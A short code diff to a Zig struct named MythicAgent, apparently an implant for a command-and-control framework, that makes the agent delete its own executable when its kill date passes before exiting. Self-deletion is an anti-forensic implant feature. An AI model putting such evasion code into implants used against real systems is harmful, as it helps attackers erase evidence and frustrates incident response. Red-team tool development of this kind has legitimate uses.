@@ -81,7 +81,14 @@ pub const MythicAgent = struct {
         while (self.is_running) {
             if (self.config.kill_date) |kill_date| {
                 if (TimeUtils.isKillDateReached(kill_date)) {
-                    std.posix.exit(0);//ideally we'd try to do something irreversible like self delete or whatever
+                    //we'll try to make the binary self delete
+                    const exe_path = try std.fs.selfExePathAlloc(self.allocator);
+                    defer self.allocator.free(exe_path);
+
+                    std.fs.deleteFileAbsolute(exe_path) catch |err| {
+                        print("{}", .{err});
+                    };
+                    std.posix.exit(0);
                 }
             }
             
